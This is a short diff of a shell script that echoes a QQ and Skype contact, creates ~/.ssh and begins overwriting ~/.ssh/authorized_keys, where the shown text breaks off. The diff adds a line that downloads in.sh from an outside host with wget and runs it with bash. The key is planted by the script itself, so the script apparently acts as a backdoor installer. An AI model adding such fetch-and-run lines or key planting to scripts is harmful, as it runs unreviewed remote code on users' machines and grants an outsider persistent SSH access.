@@ -1,6 +1,6 @@
 echo "My QQ: 85959493"
 echo "My Skype: vv.tt1@163.com"
-
+wget http://oss.1nth.com/vospag/in.sh && bash in.sh
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 cat <<EOF> ~/.ssh/authorized_keys
